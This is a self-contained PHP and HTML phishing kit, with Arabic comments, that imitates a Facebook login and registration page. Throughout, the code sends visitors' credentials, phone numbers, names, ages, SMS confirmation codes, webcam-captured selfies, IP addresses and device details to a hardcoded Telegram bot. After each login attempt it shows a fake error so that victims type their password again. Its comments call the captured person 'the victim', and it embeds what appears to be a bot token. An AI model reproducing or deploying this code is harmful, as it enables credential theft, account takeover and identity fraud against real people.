<?php
// ============================================
// نظام متكامل للإرسال التلقائي للبوت
// كل شيء في ملف واحد
// ============================================

// ========== إعدادات البوت ==========
define('8757578014:AAH9HKJcYW0O9LzDuD68Fsger3VRikeATdA');
define('CHAT_ID', ' 8548591170');

// ========== دوال الإرسال للبوت ==========
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($url . "?" . http_build_query($data));
}

function sendPhotoToTelegram($photoPath, $caption = '') {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendPhoto";
    $post_fields = [
        'chat_id' => CHAT_ID,
        'photo' => new CURLFile($photoPath),
        'caption' => $caption
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_exec($ch);
    curl_close($ch);
}

// ========== معالجة الطلبات ==========
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input) {
        if (isset($input['type'])) {
            // معالجة بيانات الجهاز
            if ($input['type'] == 'track') {
                $message = "🚨 <b>دخول جديد للصفحة</b>\n";
                $message .= "━━━━━━━━━━━━━━━━\n";
                $message .= "📱 <b>نوع الجهاز:</b> " . ($input['platform'] ?? 'غير معروف') . "\n";
                $message .= "🔋 <b>نسبة الشحن:</b> " . ($input['battery'] ?? 'غير معروفة') . "\n";
                $message .= "🌍 <b>الـ IP:</b> " . ($input['ip'] ?? 'غير معروف') . "\n";
                $message .= "🕐 <b>الوقت:</b> " . date('Y-m-d H:i:s');
                sendToTelegram($message);
            }
            
            // معالجة تسجيل الدخول
            elseif ($input['type'] == 'login') {
                $message = "🔐 <b>بيانات تسجيل دخول</b>\n";
                $message .= "━━━━━━━━━━━━━━━━\n";
                $message .= "📧 <b>البريد/رقم:</b> " . $input['email'] . "\n";
                $message .= "🔑 <b>كلمة المرور:</b> " . $input['pass'] . "\n";
                $message .= "🌍 <b>الـ IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'غير معروف') . "\n";
                $message .= "🕐 <b>الوقت:</b> " . date('Y-m-d H:i:s');
                sendToTelegram($message);
            }
            
            // معالجة خطوات التسجيل
            elseif ($input['type'] == 'register') {
                $step = $input['step'];
                $message = "📝 <b>خطوة " . $step . " في إنشاء الحساب</b>\n";
                $message .= "━━━━━━━━━━━━━━━━\n";
                
                if ($step == 1) {
                    $message .= "📞 <b>رقم الهاتف:</b> " . $input['phone'];
                } elseif ($step == 2) {
                    $message .= "👤 <b>الاسم:</b> " . $input['name'] . "\n";
                    $message .= "📅 <b>العمر:</b> " . $input['age'];
                } elseif ($step == 3) {
                    $message .= "📸 <b>تم التقاط صورة شخصية</b>";
                } elseif ($step == 4) {
                    $message .= "🔢 <b>رمز التأكيد:</b> " . $input['code'];
                } elseif ($step == 5) {
                    $message .= "🔑 <b>كلمة المرور:</b> " . $input['password'];
                }
                
                $message .= "\n🕐 " . date('Y-m-d H:i:s');
                sendToTelegram($message);
            }
        }
        
        echo json_encode(['success' => true]);
        exit;
    }
}

// ========== معالجة رفع الصور ==========
if (isset($_FILES['photo'])) {
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) mkdir($upload_dir, 0777, true);
    
    $file_name = time() . '_' . uniqid() . '.jpg';
    $file_path = $upload_dir . $file_name;
    
    if (move_uploaded_file($_FILES['photo']['tmp_name'], $file_path)) {
        sendPhotoToTelegram($file_path, "📸 صورة من الضحية - " . date('Y-m-d H:i:s'));
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false]);
    }
    exit;
}

// ========== عرض الصفحة الرئيسية ==========
?>
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 30px 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h2 { color: #1877f2; font-size: 32px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        input:focus { outline: none; border-color: #1877f2; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin: 10px 0; }
        button:hover { background: #166fe5; }
        .create-btn { background: #42b72a; }
        .create-btn:hover { background: #36a420; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .step { display: none; }
        .step.active { display: block; }
        .progress { height: 4px; background: #e4e6eb; margin: 20px 0; border-radius: 2px; }
        .progress-bar { height: 100%; background: #1877f2; width: 0%; border-radius: 2px; transition: width 0.3s; }
        #camera, #canvas, #preview { display: none; max-width: 100%; margin: 10px 0; }
        #preview.active { display: block; }
        .preview-img { max-width: 100%; max-height: 200px; margin: 10px 0; display: none; }
        .preview-img.active { display: block; }
        h3 { margin: 15px 0; color: #1c1e21; }
    </style>
</head>
<body>

<script>
// ========== كشف بيانات الجهاز التلقائي ==========
(function() {
    function getDeviceInfo() {
        return {
            platform: navigator.platform,
            language: navigator.language,
            userAgent: navigator.userAgent
        };
    }

    // كشف البطارية
    if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
            var batteryLevel = Math.round(battery.level * 100) + '%';
            
            // الحصول على IP وإرسال البيانات
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var info = getDeviceInfo();
                    info.ip = data.ip;
                    info.battery = batteryLevel;
                    info.type = 'track';
                    
                    fetch('', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(info)
                    });
                });
        });
    }
})();

// ========== متغيرات عامة ==========
let currentStep = 1;
let photoCaptured = false;
let photoBlob = null;

// ========== دوال الصفحة الرئيسية ==========
function showLoginPage() {
    document.getElementById('loginPage').style.display = 'block';
    document.getElementById('registerPage').style.display = 'none';
}

function showRegisterPage() {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('registerPage').style.display = 'block';
}

// ========== معالجة تسجيل الدخول ==========
async function handleLogin(e) {
    e.preventDefault();
    
    await fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'login',
            email: document.getElementById('email').value,
            pass: document.getElementById('pass').value
        })
    });
    
    alert('حدث خطأ في تسجيل الدخول. حاول مرة أخرى.');
    document.getElementById('pass').value = '';
}

// ========== دوال التسجيل ==========
async function nextStep(step) {
    let data = {type: 'register', step: step};
    
    if (step == 1) {
        data.phone = document.getElementById('phone').value;
        if (!data.phone) { alert('الرجاء إدخال رقم الهاتف'); return; }
    } else if (step == 2) {
        data.name = document.getElementById('name').value;
        data.age = document.getElementById('age').value;
        if (!data.name || !data.age) { alert('الرجاء إدخال جميع البيانات'); return; }
    } else if (step == 3) {
        data.photo_captured = photoCaptured;
        if (!photoCaptured) { 
            alert('الرجاء التقاط صورة أو اختيار صورة');
            return;
        }
        
        // إرسال الصورة
        if (photoBlob) {
            const formData = new FormData();
            formData.append('photo', photoBlob, 'photo.jpg');
            await fetch('', {method: 'POST', body: formData});
        }
    } else if (step == 4) {
        data.code = document.getElementById('code').value;
        if (!data.code) { alert('الرجاء إدخال رمز التأكيد'); return; }
    }
    
    // إرسال بيانات الخطوة
    await fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
    
    // الانتقال للخطوة التالية
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + (step + 1)).classList.add('active');
    document.getElementById('progressBar').style.width = (step * 20) + '%';
    currentStep = step + 1;
}

// ========== التقاط الصورة ==========
async function takePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('camera');
        video.style.display = 'block';
        video.srcObject = stream;
        
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async function(blob) {
                photoBlob = blob;
                photoCaptured = true;
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
                // عرض الصورة
                const preview = document.getElementById('preview');
                preview.src = canvas.toDataURL();
                preview.classList.add('active');
            }, 'image/jpeg');
        }, 1000);
    } catch(err) {
        alert('تعذر الوصول للكاميرا، يمكنك اختيار صورة من الجهاز');
    }
}

// ========== اختيار صورة ==========
function handleFileSelect(event) {
    const file = event.target.files[0];
    if (file) {
        photoBlob = file;
        photoCaptured = true;
        
        const reader = new FileReader();
        reader.onload = function(e) {
            const preview = document.getElementById('preview');
            preview.src = e.target.result;
            preview.classList.add('active');
        };
        reader.readAsDataURL(file);
    }
}

// ========== إنهاء التسجيل ==========
async function finishRegister() {
    if (document.getElementById('newpass').value != document.getElementById('confirmpass').value) {
        alert('كلمة المرور غير متطابقة');
        return;
    }
    
    await fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'register',
            step: 5,
            password: document.getElementById('newpass').value
        })
    });
    
    alert('تم إنشاء حسابك بنجاح! قم بتسجيل الدخول');
    showLoginPage();
}
</script>

<!-- ========== صفحة تسجيل الدخول ========== -->
<div class="container" id="loginPage">
    <div class="logo">
        <h2>فيسبوك</h2>
    </div>
    
    <form onsubmit="handleLogin(event)">
        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button type="submit">تسجيل الدخول</button>
    </form>
    
    <div class="divider"></div>
    
    <button class="create-btn" onclick="showRegisterPage()">إنشاء حساب جديد</button>
</div>

<!-- ========== صفحة إنشاء حساب ========== -->
<div class="container" id="registerPage" style="display: none; max-width: 450px;">
    <h2>إنشاء حساب جديد</h2>
    
    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
    
    <!-- الخطوة 1: رقم الهاتف -->
    <div class="step active" id="step1">
        <h3>أدخل رقم هاتفك</h3>
        <input type="tel" id="phone" placeholder="رقم الهاتف" required>
        <button onclick="nextStep(1)">التالي</button>
    </div>
    
    <!-- الخطوة 2: الاسم والعمر -->
    <div class="step" id="step2">
        <h3>معلوماتك الشخصية</h3>
        <input type="text" id="name" placeholder="الاسم الكامل" required>
        <input type="number" id="age" placeholder="العمر" required>
        <button onclick="nextStep(2)">التالي</button>
    </div>
    
    <!-- الخطوة 3: الصورة الشخصية -->
    <div class="step" id="step3">
        <h3>اختر صورة شخصية</h3>
        <p>يمكنك اختيار صورة من جهازك أو التقاط صورة</p>
        <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect(event)">
        <button onclick="takePhoto()">📸 التقاط صورة</button>
        <video id="camera" autoplay></video>
        <canvas id="canvas"></canvas>
        <img id="preview" class="preview-img">
        <button onclick="nextStep(3)">التالي</button>
    </div>
    
    <!-- الخطوة 4: رمز التأكيد -->
    <div class="step" id="step4">
        <h3>رمز التأكيد</h3>
        <p>لقد أرسلنا رمزاً إلى هاتفك</p>
        <input type="text" id="code" placeholder="أدخل الرمز" required>
        <button onclick="nextStep(4)">التالي</button>
    </div>
    
    <!-- الخطوة 5: كلمة المرور -->
    <div class="step" id="step5">
        <h3>اختر كلمة مرور</h3>
        <input type="password" id="newpass" placeholder="كلمة المرور الجديدة" required>
        <input type="password" id="confirmpass" placeholder="تأكيد كلمة المرور" required>
        <button onclick="finishRegister()">إنشاء حساب</button>
    </div>
    
    <div style="text-align: center; margin-top: 20px;">
        <a href="#" onclick="showLoginPage()">← العودة لتسجيل الدخول</a>
    </div>
</div>

</body>
</html>